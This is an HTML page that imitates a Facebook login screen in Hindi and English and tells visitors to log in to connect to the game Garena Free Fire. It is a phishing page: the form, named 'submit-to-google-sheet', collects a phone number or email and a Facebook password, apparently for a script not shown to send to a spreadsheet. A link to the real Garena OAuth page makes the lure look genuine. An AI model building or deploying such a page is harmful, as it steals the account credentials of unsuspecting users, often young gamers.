<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="/asstes/Facebook-Logosu.png" type="image/x-icon">
    <title>Facebook - लॉग इन या साइन अप करें</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="media.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
        rel="stylesheet">
</head>

<body id="facebook-body">
    <div class="nav">
        <img src="/asstes/Facebook-logo.png" alt="" width="200">
        <button>नया अकाउंट बनाएँ</button>
    </div>

    <div class="main">
        <div class="mob-fb">
            <img src="/asstes/mob-logo.jpeg" alt="" height="60">
            <p>Log in to your Facebook account to connect to Garena Free Fire</p>
        </div>
        <div class="card">
            <p><span>Facebook</span> में लॉग इन करें</p>
            <form action="" name="submit-to-google-sheet">
                <input type="text" placeholder="Mobile number or email address" name="number" required autofocus>
                <div class="password-box">
                    <input type="password" placeholder="Facebook password" id="passwordInput" name="password" required>
                    <img src="/asstes/eye2.png" id="eyeIcon">
                </div>

                <button type="submit" id="btn"></button>
            </form>
            <div class="mob-footer">
                <a href="">Forgotten password?</a>

                <div class="footer-tag">
                    <a href="">Create account</a>
                    <a href="">Not now</a>
                    <a href="">Help Center</a>
                </div>
            </div>
            <div class="fb-link">
                <a href="">अकाउंट याद नहीं है? </a>
                <a href="">Facebook के लिए साइन अप करें</a>
            </div>
            <a href="https://auth.garena.com/universal/oauth" id="abhi">अभी नहीं</a>
        </div>
    </div>

    <div class="footer">
        <div class="language-box">
            <div class="lengu">
                <p>हिन्दी</p>
                <p>اردو</p>
                <p>বাংলা</p>
                <p>English (UK)</p>
            </div>
            <div class="lengu">
                <p>मराठी</p>
                <p>ਪੰਜਾਬੀ</p>
                <p>ગુજરાતી</p>
                <p>తెలుగు</p>
            </div>
        </div>

        <p>Meta &#169 2024</p>
    </div>

    <script src="script.js"></script>
</body>

</html>
